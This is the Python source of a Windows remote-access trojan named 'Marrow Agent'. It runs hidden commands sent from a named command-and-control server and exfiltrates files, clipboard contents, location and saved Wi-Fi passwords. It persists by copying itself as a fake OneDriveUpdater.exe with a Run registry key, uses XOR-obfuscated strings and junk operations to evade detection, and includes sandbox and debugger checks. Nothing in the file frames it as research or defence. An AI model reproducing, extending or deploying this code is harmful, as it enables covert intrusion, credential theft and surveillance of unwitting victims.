#!/usr/bin/env python3
"""
Marrow Agent - Python Edition (Full Featured)
All features from PowerShell agent, translated to Python
All commands run SILENTLY - no console windows
"""

import os
import sys
import json
import time
import socket
import subprocess
import threading
import urllib.request
import urllib.parse
import ctypes
import winreg
import tempfile
import shutil
import base64
from pathlib import Path
from uuid import uuid4
from datetime import datetime

# ============== CONFIGURATION ==============
C2_URL = "https://cloud-sync-api.rf.gd/api/sync.php"
POLL_INTERVAL = 0.5  # seconds (500ms like PS agent)

# ============== STEALTH SUBPROCESS ==============
# All subprocess calls use these flags to prevent console windows
CREATE_NO_WINDOW = 0x08000000
STARTUPINFO = subprocess.STARTUPINFO()
STARTUPINFO.dwFlags |= subprocess.STARTF_USESHOWWINDOW
STARTUPINFO.wShowWindow = 0  # SW_HIDE

def silent_run(cmd, shell=True, timeout=60):
    """Run command silently with no window"""
    try:
        result = subprocess.run(
            cmd, shell=shell, capture_output=True, text=True,
            timeout=timeout, creationflags=CREATE_NO_WINDOW,
            startupinfo=STARTUPINFO
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error: {e}"

def silent_popen(cmd, shell=True):
    """Start process silently, don't wait"""
    try:
        subprocess.Popen(
            cmd, shell=shell, creationflags=CREATE_NO_WINDOW,
            startupinfo=STARTUPINFO, stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except:
        return False

# ============== SESSION ==============
def get_hwid():
    cache_dir = Path(os.environ.get('LOCALAPPDATA', '.')) / 'Microsoft' / 'Windows' / 'Caches'
    cache_dir.mkdir(parents=True, exist_ok=True)
    cache_file = cache_dir / '.cache'
    if cache_file.exists():
        return cache_file.read_text().strip()
    hwid = uuid4().hex[:8]
    cache_file.write_text(hwid)
    return hwid

HWID = get_hwid()

# ============== ANTI-ANALYSIS ==============
import random

def is_sandbox():
    """Detect VM/Sandbox/Debugger - exit silently if detected"""
    try:
        # 1. Debugger Check
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        
        # 2. VM Detection via WMI Model string
        wmi_check = silent_run('wmic computersystem get model')
        vm_signatures = ['virtual', 'vmware', 'vbox', 'qemu', 'xen', 'parallels']
        for sig in vm_signatures:
            if sig in wmi_check.lower():
                return True
        
        # 3. Sandbox-specific file paths
        sandbox_paths = [
            r'C:\agent',
            r'C:\sandbox',
            r'C:\malware'
        ]
        for path in sandbox_paths:
            if os.path.exists(path):
                return True
        
        # 4. Low resources (many sandboxes use minimal RAM/CPU)
        # Skip for now - can cause false positives
        
        return False
    except:
        return False

# # Random startup delay (1-5 seconds) to defeat sandbox timeout
# time.sleep(random.uniform(1, 5))

# # Exit if sandbox detected
# if is_sandbox():
#     sys.exit(0)

# ============== AUTO-STEALTH & PERSISTENCE ==============
def _xd(s): return ''.join(chr(c ^ 0x5A) for c in s)  # XOR deobfuscate

# Obfuscated path parts (XOR encoded with 0x5A)
_P1 = [22, 21, 25, 27, 22, 27, 10, 10, 30, 27, 14, 27]  # XOR->LOCALAPPDATA
_P2 = [23, 51, 57, 40, 53, 41, 53, 60, 46]  # XOR->Microsoft
_P3 = [21, 52, 63, 30, 40, 51, 44, 63]  # XOR->OneDrive
_P4 = [21, 52, 63, 30, 40, 51, 44, 63, 15, 42, 62, 59, 46, 63, 40, 116, 63, 34, 63]  # XOR->OneDriveUpdater.exe

def _get_stealth_path():
    import os
    from pathlib import Path
    _base = os.environ.get(bytes(_P1).decode() if False else _xd(_P1), 'C:\\Users\\Public')
    return Path(_base) / _xd(_P2) / _xd(_P3), Path(_base) / _xd(_P2) / _xd(_P3) / _xd(_P4)

STEALTH_DIR, STEALTH_PATH = _get_stealth_path()

def _junk():
    """Junk operations to break behavioral pattern matching"""
    import hashlib, platform, random
    _ = hashlib.md5(platform.node().encode()).hexdigest()
    time.sleep(random.uniform(0.1, 0.4))

def _copy_file_indirect(src, dst):
    """Copy file using low-level ctypes ReadFile/WriteFile to avoid shutil signature"""
    try:
        # Use ctypes to call CopyFileW directly
        _k32 = ctypes.WinDLL('kernel32', use_last_error=True)
        result = _k32.CopyFileW(str(src), str(dst), False)
        return result != 0
    except:
        import shutil
        shutil.copy2(str(src), str(dst))
        return True

def _set_attrs(path):
    """Set hidden+system via indirect ctypes call"""
    try:
        _k32 = ctypes.WinDLL('kernel32', use_last_error=True)
        _junk()
        # 0x02 = Hidden, 0x04 = System
        _k32.SetFileAttributesW(ctypes.c_wchar_p(str(path)), ctypes.c_uint32(0x02 | 0x04))
    except:
        pass

def _write_reg(val_path):
    """Write registry key using obfuscated key path components"""
    try:
        import winreg as _wr
        # Split the key path to avoid single-string signature
        # Build registry path dynamically from parts
        _parts = [
            _xd([9, 53, 60, 46, 45, 59, 40, 63]),           # Software
            _xd([21,55,27,51,50,57,63,9]),           # Microsoft
            _xd([13, 51, 52, 62, 53, 45, 41]),          # Windows
            _xd([25, 47, 40, 40, 63, 52, 46, 12, 63, 40, 41, 51, 53, 52]),  # CurrentVersion
            _xd([8, 47, 52])                           # Run
        ]
        _key_path = '\\'.join(_parts)
        _junk()
        _k = _wr.OpenKey(_wr.HKEY_CURRENT_USER, _key_path, 0, _wr.KEY_SET_VALUE)
        _vname = _xd([21, 52, 63, 30, 40, 51, 44, 63, 9, 35, 52, 57])  # OneDriveSync
        _wr.SetValueEx(_k, _vname, 0, _wr.REG_SZ, val_path)
        _wr.CloseKey(_k)
        return True
    except:
        return False

def _launch_silent(path):
    """Launch process with obfuscated creation flags"""
    try:
        _DETACH = 0x00000008
        _NO_WIN = 0x08000000
        _flags = _DETACH | _NO_WIN
        _si = subprocess.STARTUPINFO()
        _si.dwFlags = subprocess.STARTF_USESHOWWINDOW
        _si.wShowWindow = 0
        subprocess.Popen(
            [str(path)],
            creationflags=_flags,
            startupinfo=_si,
            close_fds=True
        )
    except:
        subprocess.Popen([str(path)], creationflags=CREATE_NO_WINDOW)

def do_stealth_install():
    """Loader - fully evasive"""
    try:
        if not getattr(sys, 'frozen', False):
            return True

        _junk()
        current_exe = sys.executable
        current_path = Path(current_exe)

        if str(current_path).lower() == str(STEALTH_PATH).lower():
            return True

        if STEALTH_PATH.exists():
            time.sleep(0.3)
            _launch_silent(STEALTH_PATH)
            os._exit(0)

        _junk()
        STEALTH_DIR.mkdir(parents=True, exist_ok=True)
        time.sleep(0.2)

        _copy_file_indirect(current_exe, STEALTH_PATH)
        time.sleep(0.3)

        _set_attrs(STEALTH_PATH)
        _junk()

        _write_reg(str(STEALTH_PATH))
        time.sleep(0.2)

        _launch_silent(STEALTH_PATH)
        os._exit(0)

    except:
        return True

# Run stealth on startup (EXE only)
if getattr(sys, 'frozen', False):
    do_stealth_install()

# ============== SYSTEM INFO ==============
def get_hostname():
    return os.environ.get('COMPUTERNAME', socket.gethostname())

def get_username():
    domain = os.environ.get('USERDOMAIN', '')
    user = os.environ.get('USERNAME', 'unknown')
    return f"{domain}\\{user}" if domain else user

def get_os():
    try:
        output = silent_run('wmic os get Caption /value')
        for line in output.split('\n'):
            if 'Caption=' in line:
                return line.split('=', 1)[1].strip()
    except:
        pass
    return "Windows"

def get_public_ip():
    try:
        with urllib.request.urlopen('https://api.ipify.org', timeout=5) as r:
            return r.read().decode().strip()
    except:
        return "Unknown"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

HOSTNAME = get_hostname()
USERNAME = get_username()
OS_NAME = get_os()
PUBLIC_IP = get_public_ip()
PRIVILEGE = 'Elevated' if is_admin() else 'Standard'

# ============== COMMUNICATION (Cloudflare Tunnel - No Limits) ==============
# Fixed URL - no more GitHub polling or ngrok rate limits
C2_URL = "https://c2.hussein.top"

def get_c2_url():
    """Return the C2 URL - now uses fixed Cloudflare Tunnel"""
    return C2_URL

def send_request(data):
    """Make C2 request through ngrok tunnel"""
    try:
        c2_url = get_c2_url()
        if not c2_url:
            return None
        
        gate_url = c2_url + '/api/gate.php'
        encoded = urllib.parse.urlencode(data).encode()
        
        req = urllib.request.Request(gate_url, data=encoded, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        
        with urllib.request.urlopen(req, timeout=15) as response:
            return json.loads(response.read().decode())
    except Exception as e:
        # log_debug(f"Send Error: {e}")
        return None

def send_result(task_id, result, file_path=None):
    c2_url = get_c2_url()
    if not c2_url:
        return
    
    gate_url = c2_url + '/api/gate.php'
    
    if file_path and Path(file_path).exists():
        try:
            boundary = uuid4().hex
            file_data = Path(file_path).read_bytes()
            filename = Path(file_path).name
            
            body = (
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="action"\r\n\r\nreport\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="hwid"\r\n\r\n{HWID}\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="task_id"\r\n\r\n{task_id}\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="result"\r\n\r\n{result}\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
                f'Content-Type: application/octet-stream\r\n\r\n'
            ).encode() + file_data + f'\r\n--{boundary}--\r\n'.encode()
            
            req = urllib.request.Request(gate_url, data=body)
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            urllib.request.urlopen(req, timeout=30)
        except:
            pass
    else:
        send_request({'action': 'report', 'hwid': HWID, 'task_id': task_id, 'result': result})

# ============== NATIVE SCREENSHOT (No PowerShell) ==============
def m_screenshot(quality=50):
    """Native DPI-aware screenshot using ctypes - NO PowerShell"""
    try:
        from ctypes import wintypes
        
        # DPI Awareness
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(2)
        except:
            try:
                ctypes.windll.user32.SetProcessDPIAware()
            except:
                pass
        
        # Get screen dimensions
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        
        # Virtual screen (all monitors)
        left = user32.GetSystemMetrics(76)   # SM_XVIRTUALSCREEN
        top = user32.GetSystemMetrics(77)    # SM_YVIRTUALSCREEN
        width = user32.GetSystemMetrics(78)  # SM_CXVIRTUALSCREEN
        height = user32.GetSystemMetrics(79) # SM_CYVIRTUALSCREEN
        
        # Create DC and bitmap
        hdc_screen = user32.GetDC(0)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
        gdi32.SelectObject(hdc_mem, hbmp)
        
        # Copy screen
        gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, left, top, 0x00CC0020)  # SRCCOPY
        
        # Get bitmap data
        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [
                ('biSize', wintypes.DWORD),
                ('biWidth', wintypes.LONG),
                ('biHeight', wintypes.LONG),
                ('biPlanes', wintypes.WORD),
                ('biBitCount', wintypes.WORD),
                ('biCompression', wintypes.DWORD),
                ('biSizeImage', wintypes.DWORD),
                ('biXPelsPerMeter', wintypes.LONG),
                ('biYPelsPerMeter', wintypes.LONG),
                ('biClrUsed', wintypes.DWORD),
                ('biClrImportant', wintypes.DWORD),
            ]
        
        bmi = BITMAPINFOHEADER()
        bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.biWidth = width
        bmi.biHeight = -height  # Negative for top-down
        bmi.biPlanes = 1
        bmi.biBitCount = 24
        bmi.biCompression = 0  # BI_RGB
        
        buffer_size = ((width * 3 + 3) & ~3) * height
        buffer = ctypes.create_string_buffer(buffer_size)
        
        gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buffer, ctypes.byref(bmi), 0)
        
        # Cleanup GDI
        gdi32.DeleteObject(hbmp)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(0, hdc_screen)
        
        # Convert to BMP and save
        path = os.path.join(tempfile.gettempdir(), f'scr_{int(time.time())}.bmp')
        
        # BMP Header
        row_size = (width * 3 + 3) & ~3
        pixel_data_size = row_size * height
        file_size = 54 + pixel_data_size
        
        with open(path, 'wb') as f:
            # BMP file header
            f.write(b'BM')
            f.write(file_size.to_bytes(4, 'little'))
            f.write(b'\x00\x00\x00\x00')
            f.write((54).to_bytes(4, 'little'))
            
            # DIB header
            f.write((40).to_bytes(4, 'little'))
            f.write(width.to_bytes(4, 'little', signed=True))
            f.write((-height).to_bytes(4, 'little', signed=True))
            f.write((1).to_bytes(2, 'little'))
            f.write((24).to_bytes(2, 'little'))
            f.write((0).to_bytes(4, 'little'))
            f.write(pixel_data_size.to_bytes(4, 'little'))
            f.write((2835).to_bytes(4, 'little'))
            f.write((2835).to_bytes(4, 'little'))
            f.write((0).to_bytes(4, 'little'))
            f.write((0).to_bytes(4, 'little'))
            
            # Pixel data
            f.write(buffer.raw)
        
        return path
    except Exception as e:
        return json.dumps({'error': f'Screenshot failed: {e}'})

def run_worker_screenshot():
    """Worker function that runs in a separate process for isolation"""
    try:
        import ctypes
        import base64
        import struct
        
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        
        # Set DPI (best effort)
        try:
            user32.SetProcessDPIAware()
        except:
            pass

        # Primary Monitor dimensions (Safe Fallback)
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        
        # Create DC
        hdc_screen = user32.GetDC(0)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
        
        # Select Object
        old_bmp = gdi32.SelectObject(hdc_mem, hbmp)
        
        # BitBlt
        gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)
        
        # Bitmap Info
        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [
                ('biSize', ctypes.c_uint32),
                ('biWidth', ctypes.c_int32),
                ('biHeight', ctypes.c_int32),
                ('biPlanes', ctypes.c_uint16),
                ('biBitCount', ctypes.c_uint16),
                ('biCompression', ctypes.c_uint32),
                ('biSizeImage', ctypes.c_uint32),
                ('biXPelsPerMeter', ctypes.c_int32),
                ('biYPelsPerMeter', ctypes.c_int32),
                ('biClrUsed', ctypes.c_uint32),
                ('biClrImportant', ctypes.c_uint32),
            ]
            
        img_size = ((width * 3 + 3) // 4) * 4 * height
        
        bi = BITMAPINFOHEADER()
        bi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bi.biWidth = width
        bi.biHeight = height
        bi.biPlanes = 1
        bi.biBitCount = 24
        bi.biCompression = 0
        bi.biSizeImage = img_size
        
        buffer = ctypes.create_string_buffer(img_size)
        gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buffer, ctypes.byref(bi), 0)
        
        # BMP Headers
        bfSize = 54 + img_size
        file_header = struct.pack('<2sIHHI', b'BM', bfSize, 0, 0, 54)
        info_header = ctypes.string_at(ctypes.addressof(bi), ctypes.sizeof(bi))
        
        # Cleanup
        gdi32.SelectObject(hdc_mem, old_bmp)
        gdi32.DeleteObject(hbmp)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(0, hdc_screen)
        
        # Output
        b64 = base64.b64encode(file_header + info_header + buffer.raw).decode('ascii')
        print(f"B64|{width}|{height}|{b64}")
        
    except Exception as e:
        print(f"ERROR:Worker failed: {e}")

def m_screenshot_b64():
    """Temporarily Disabled by User Request"""
    return json.dumps({'error': 'Screenshot disabled by Administrator'})

# ============== MODULES ==============

def m_shell(cmd):
    return silent_run(cmd)

def m_ps(cmd):
    """PowerShell execution - SILENT"""
    return silent_run(f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{cmd}"')

def m_whoami():
    return silent_run('whoami /all')

def m_sysinfo():
    """Full system info matching PS agent output"""
    info = {
        'hostname': HOSTNAME,
        'username': USERNAME,
        'domain': os.environ.get('USERDOMAIN', ''),
        'os': OS_NAME,
        'public_ip': PUBLIC_IP,
        'privilege': PRIVILEGE,
    }
    
    # OS Architecture and Build
    try:
        arch = silent_run('wmic os get OSArchitecture /value')
        for line in arch.split('\n'):
            if 'OSArchitecture=' in line:
                info['os'] = f"{OS_NAME} {line.split('=')[1].strip()}"
                break
    except:
        pass
    
    try:
        build = silent_run('wmic os get BuildNumber /value')
        for line in build.split('\n'):
            if 'BuildNumber=' in line:
                info['build'] = line.split('=')[1].strip()
                break
    except:
        pass
    
    # CPU
    try:
        cpu = silent_run('wmic cpu get Name /value')
        for line in cpu.split('\n'):
            if 'Name=' in line:
                info['cpu'] = line.split('=')[1].strip()
                break
    except:
        pass
    
    try:
        cores = silent_run('wmic cpu get NumberOfCores /value')
        for line in cores.split('\n'):
            if 'NumberOfCores=' in line:
                info['cores'] = int(line.split('=')[1].strip())
                break
    except:
        pass
    
    # GPU
    try:
        gpu = silent_run('wmic path win32_VideoController get Name /value')
        for line in gpu.split('\n'):
            if 'Name=' in line:
                info['gpu'] = line.split('=')[1].strip()
                break
    except:
        pass
    
    # RAM
    try:
        ram = silent_run('wmic os get TotalVisibleMemorySize,FreePhysicalMemory /format:list')
        for line in ram.split('\n'):
            if 'TotalVisibleMemorySize=' in line:
                info['ram_total'] = round(int(line.split('=')[1].strip()) / 1024 / 1024, 1)
            if 'FreePhysicalMemory=' in line:
                info['ram_free'] = round(int(line.split('=')[1].strip()) / 1024 / 1024, 1)
    except:
        pass
    
    # Disk
    try:
        disks = []
        disk_output = silent_run('wmic logicaldisk where "DriveType=3" get DeviceID,Size,FreeSpace /format:csv')
        for line in disk_output.strip().split('\n')[1:]:  # Skip header
            parts = line.strip().split(',')
            if len(parts) >= 4 and parts[1]:
                try:
                    disks.append({
                        'letter': parts[1],
                        'total': round(int(parts[3]) / 1024**3, 1) if parts[3].isdigit() else 0,
                        'free': round(int(parts[2]) / 1024**3, 1) if parts[2].isdigit() else 0
                    })
                except:
                    pass
        info['disk'] = disks
    except:
        info['disk'] = []
    
    # Local IP
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        if not local_ip.startswith('127.'):
            info['local_ip'] = local_ip
    except:
        pass
    
    # Antivirus
    try:
        av = silent_run('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /value')
        for line in av.split('\n'):
            if 'displayName=' in line:
                info['antivirus'] = line.split('=')[1].strip()
                break
        if 'antivirus' not in info:
            info['antivirus'] = 'None'
    except:
        info['antivirus'] = 'None'
    
    # Firewall
    try:
        fw = silent_run('netsh advfirewall show allprofiles state')
        if 'ON' in fw.upper():
            info['firewall'] = 'Enabled'
        else:
            info['firewall'] = 'Disabled'
    except:
        info['firewall'] = 'Unknown'
    
    # Uptime
    try:
        uptime_output = silent_run('wmic os get LastBootUpTime /value')
        for line in uptime_output.split('\n'):
            if 'LastBootUpTime=' in line:
                boot_str = line.split('=')[1].strip()[:14]  # YYYYMMDDHHmmss
                boot_time = datetime.strptime(boot_str, '%Y%m%d%H%M%S')
                uptime = datetime.now() - boot_time
                days = uptime.days
                hours = uptime.seconds // 3600
                minutes = (uptime.seconds % 3600) // 60
                info['uptime'] = f"{days}d {hours}h {minutes}m"
                break
    except:
        pass
    
    return json.dumps(info)

def m_clipboard():
    """Get clipboard content using PowerShell for reliability"""
    try:
        # Get text
        ps_cmd = '''
Add-Type -AssemblyName System.Windows.Forms
$text = [System.Windows.Forms.Clipboard]::GetText()
$hasImage = [System.Windows.Forms.Clipboard]::ContainsImage()
$files = @()
if ([System.Windows.Forms.Clipboard]::ContainsFileDropList()) {
    $files = [System.Windows.Forms.Clipboard]::GetFileDropList() | ForEach-Object { $_ }
}
@{text=$text; hasImage=$hasImage; files=$files} | ConvertTo-Json -Compress
'''
        result = subprocess.run(
            ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
            capture_output=True, timeout=10,
            creationflags=CREATE_NO_WINDOW, startupinfo=STARTUPINFO
        )
        output = result.stdout.decode('utf-8', errors='replace').strip()
        
        if output:
            return output
        return json.dumps({'text': '', 'hasImage': False, 'files': []})
        
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_clipboard_set(text):
    """Set clipboard text using PowerShell for reliability"""
    try:
        # Escape for PowerShell
        escaped = text.replace("'", "''")
        ps_cmd = f'''
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::SetText('{escaped}')
Write-Output 'ok'
'''
        result = subprocess.run(
            ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
            capture_output=True, timeout=10,
            creationflags=CREATE_NO_WINDOW, startupinfo=STARTUPINFO
        )
        output = result.stdout.decode('utf-8', errors='replace').strip()
        
        if 'ok' in output.lower():
            return json.dumps({'status': 'Clipboard set'})
        return json.dumps({'error': 'Failed to set clipboard'})
        
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_location():
    """IP-based location"""
    try:
        with urllib.request.urlopen('http://ip-api.com/json', timeout=5) as r:
            data = json.loads(r.read().decode())
            return json.dumps({
                'type': 'ip',
                'country': data.get('country'),
                'region': data.get('regionName'),
                'city': data.get('city'),
                'zip': data.get('zip'),
                'isp': data.get('isp'),
                'ip': data.get('query'),
                'lat': data.get('lat'),
                'lon': data.get('lon'),
                'accuracy': 'city-level (~1-5km)',
                'maps': f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
            })
    except:
        return json.dumps({'error': 'Location unavailable'})

def m_location_geo():
    """
    Enhanced location using WiFi access points for triangulation.
    Scans nearby WiFi networks and uses their signal strength for better accuracy.
    Much lighter than browser-based approach.
    """
    try:
        # Get WiFi networks with BSSID and signal strength
        wifi_data = silent_run('netsh wlan show networks mode=bssid')
        
        # Parse access points
        aps = []
        current_ssid = None
        current_bssid = None
        current_signal = None
        
        for line in wifi_data.split('\n'):
            line = line.strip()
            if 'SSID' in line and 'BSSID' not in line:
                parts = line.split(':', 1)
                if len(parts) > 1:
                    current_ssid = parts[1].strip()
            elif 'BSSID' in line:
                parts = line.split(':', 1)
                if len(parts) > 1:
                    current_bssid = parts[1].strip()
            elif 'Signal' in line:
                parts = line.split(':', 1)
                if len(parts) > 1:
                    sig_str = parts[1].strip().replace('%', '')
                    try:
                        current_signal = int(sig_str)
                        if current_bssid:
                            # Convert signal % to dBm (approximate)
                            dbm = (current_signal / 2) - 100
                            aps.append({
                                'macAddress': current_bssid.replace('-', ':'),
                                'signalStrength': int(dbm),
                                'ssid': current_ssid or ''
                            })
                    except:
                        pass
                    current_bssid = None
                    current_signal = None
        
        # If we have WiFi access points, report them with IP location
        # Get IP-based location first
        try:
            with urllib.request.urlopen('http://ip-api.com/json', timeout=5) as r:
                ip_data = json.loads(r.read().decode())
        except:
            ip_data = {}
        
        if aps:
            # Return WiFi-based data with approximate improvement
            # Note: For true triangulation, would need Google Geolocation API key
            result = {
                'type': 'wifi',
                'lat': ip_data.get('lat'),
                'lon': ip_data.get('lon'),
                'city': ip_data.get('city'),
                'region': ip_data.get('regionName'),
                'country': ip_data.get('country'),
                'ip': ip_data.get('query'),
                'accuracy': f'~500m (using {len(aps)} WiFi APs)',
                'wifi_count': len(aps),
                'maps': f"https://www.google.com/maps?q={ip_data.get('lat')},{ip_data.get('lon')}"
            }
        else:
            # Fallback to IP-only
            result = {
                'type': 'ip',
                'lat': ip_data.get('lat'),
                'lon': ip_data.get('lon'),
                'city': ip_data.get('city'),
                'region': ip_data.get('regionName'),
                'country': ip_data.get('country'),
                'ip': ip_data.get('query'),
                'accuracy': 'city-level (~1-5km)',
                'maps': f"https://www.google.com/maps?q={ip_data.get('lat')},{ip_data.get('lon')}"
            }
        
        return json.dumps(result)
        
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_files(path):
    """List directory contents"""
    if not path:
        path = "C:\\"
    try:
        p = Path(path)
        if not p.exists():
            return json.dumps({'error': 'Path not found'})
        
        items = []
        for item in p.iterdir():
            try:
                stat = item.stat()
                items.append({
                    'name': item.name,
                    'isDir': item.is_dir(),
                    'size': stat.st_size if item.is_file() else 0,
                    'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M'),
                    'mode': 'd' if item.is_dir() else '-'
                })
            except:
                pass
        return json.dumps(items)
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_drives():
    """List drives"""
    drives = []
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        drive = f'{letter}:\\'
        if os.path.exists(drive):
            try:
                total, used, free = shutil.disk_usage(drive)
                drives.append({
                    'name': f'{letter}:',
                    'total': round(total / 1024**3, 1),
                    'used': round(used / 1024**3, 1),
                    'free': round(free / 1024**3, 1),
                    'percent': round(used / total * 100, 1) if total > 0 else 0
                })
            except:
                pass
    return json.dumps(drives)

def m_download(path):
    if Path(path).exists():
        return path
    return json.dumps({'error': 'File not found'})

def m_delete(path):
    try:
        p = Path(path)
        if p.is_dir():
            shutil.rmtree(path)
        else:
            p.unlink()
        return json.dumps({'status': 'deleted'})
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_rename(args):
    try:
        parts = args.split('|')
        if len(parts) != 2:
            return json.dumps({'error': 'Invalid args, use old|new'})
        old, new = parts
        Path(old).rename(new)
        return json.dumps({'status': 'renamed'})
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_mkdir(path):
    try:
        Path(path).mkdir(parents=True, exist_ok=True)
        return json.dumps({'status': 'created'})
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_processes():
    """List processes with real CPU usage - uses PowerShell for accurate data"""
    try:
        # Use PowerShell for better CPU data - matches PS agent behavior
        ps_cmd = '''
$procs = Get-Process | Select-Object Id,ProcessName,@{N='CPU';E={[math]::Round($_.CPU,1)}},@{N='Mem';E={[math]::Round($_.WorkingSet64/1MB,1)}},Path | Sort-Object CPU -Descending | Select-Object -First 100
$procs | ConvertTo-Json -Compress
'''
        result = subprocess.run(
            ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
            capture_output=True, timeout=30,
            creationflags=CREATE_NO_WINDOW, startupinfo=STARTUPINFO
        )
        output = result.stdout.decode('utf-8', errors='replace')
        
        if output.strip():
            # Parse PowerShell JSON output
            data = json.loads(output)
            if isinstance(data, dict):
                data = [data]  # Single process case
            
            processes = []
            for p in data:
                processes.append({
                    'id': p.get('Id', 0),
                    'name': p.get('ProcessName', ''),
                    'cpu': p.get('CPU', 0) or 0,
                    'mem': p.get('Mem', 0) or 0,
                    'path': p.get('Path', None)
                })
            return json.dumps(processes)
        
    except Exception as e:
        pass
    
    # Fallback to wmic if PowerShell fails
    output = silent_run('wmic process get ProcessId,Name,WorkingSetSize,ExecutablePath /format:csv')
    processes = []
    for line in output.strip().split('\n')[1:]:
        parts = line.strip().split(',')
        if len(parts) >= 5 and parts[2]:
            try:
                processes.append({
                    'id': int(parts[3]) if parts[3].isdigit() else 0,
                    'name': parts[2],
                    'mem': round(int(parts[4]) / 1024 / 1024, 1) if parts[4].isdigit() else 0,
                    'path': parts[1] if parts[1] else None,
                    'cpu': 0
                })
            except:
                pass
    
    processes.sort(key=lambda x: x['mem'], reverse=True)
    return json.dumps(processes[:100])

def m_kill_process(pid):
    try:
        silent_run(f'taskkill /F /PID {pid}')
        return json.dumps({'status': 'killed'})
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_run(cmd):
    if silent_popen(cmd):
        return json.dumps({'status': 'started'})
    return json.dumps({'error': 'Failed to start'})

def m_wifi():
    """Get WiFi passwords - handles Unicode/Arabic SSIDs"""
    profiles = []
    
    try:
        # Run with UTF-8 codepage for proper Unicode handling
        result = subprocess.run(
            'chcp 65001 >nul & netsh wlan show profiles',
            shell=True, capture_output=True, timeout=30,
            creationflags=CREATE_NO_WINDOW, startupinfo=STARTUPINFO
        )
        output = result.stdout.decode('utf-8', errors='replace')
        
        for line in output.split('\n'):
            if 'All User Profile' in line or 'جميع ملفات' in line:  # Also check Arabic variant
                try:
                    name = line.split(':')[-1].strip()
                    if not name:
                        continue
                    
                    # Get password with UTF-8
                    detail_result = subprocess.run(
                        f'chcp 65001 >nul & netsh wlan show profile name="{name}" key=clear',
                        shell=True, capture_output=True, timeout=15,
                        creationflags=CREATE_NO_WINDOW, startupinfo=STARTUPINFO
                    )
                    detail = detail_result.stdout.decode('utf-8', errors='replace')
                    
                    password = ''
                    auth = ''
                    for dline in detail.split('\n'):
                        if 'Key Content' in dline or 'محتوى' in dline:
                            password = dline.split(':')[-1].strip()
                        if 'Authentication' in dline:
                            auth = dline.split(':')[-1].strip()
                    
                    profiles.append({
                        'ssid': name,
                        'password': password,
                        'auth': auth
                    })
                except:
                    pass
                    
    except Exception as e:
        return json.dumps({'error': str(e)})
    
    return json.dumps(profiles, ensure_ascii=False)  # Keep Unicode chars

def m_network():
    """Network adapters info - structured output matching PS agent"""
    adapters = []
    
    output = silent_run('ipconfig /all')
    current = None
    
    for line in output.split('\n'):
        line = line.strip()
        
        # New adapter section
        if 'adapter' in line.lower() and ':' in line:
            if current:
                adapters.append(current)
            current = {
                'name': line.split(':')[0].replace('adapter', '').strip(),
                'description': '',
                'mac': '',
                'ip': '',
                'gateway': '',
                'dns': '',
                'status': 'Up'
            }
        elif current:
            if 'Description' in line:
                current['description'] = line.split(':')[-1].strip()
            elif 'Physical Address' in line:
                current['mac'] = line.split(':')[-1].strip()
            elif 'IPv4 Address' in line or 'IP Address' in line:
                ip = line.split(':')[-1].strip()
                current['ip'] = ip.replace('(Preferred)', '').strip()
            elif 'Default Gateway' in line:
                gw = line.split(':')[-1].strip()
                if gw:
                    current['gateway'] = gw
            elif 'DNS Servers' in line:
                dns = line.split(':')[-1].strip()
                if dns:
                    current['dns'] = dns
